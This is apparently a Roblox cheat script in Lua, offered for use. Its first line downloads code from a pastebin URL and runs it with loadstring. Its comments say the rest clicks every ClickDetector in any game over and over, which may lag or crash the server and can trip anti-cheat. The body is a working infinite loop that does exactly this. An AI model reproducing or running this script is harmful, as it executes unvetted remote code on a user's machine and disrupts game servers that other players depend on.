loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
--< Loadstring: No loadstring.
--< Game: Universal
--< Functionality: Allows you to repeatedly loop click every single clickdetector inside a game, which might lag or crash the server. Some anti-cheat scripts built in-game may detect this.

while true do
    repeat
        wait(.1)
for i,v in pairs(workspace:GetDescendants()) do
            if v:IsA("ClickDetector") then
                fireclickdetector(v)
            end
        end
until false
end
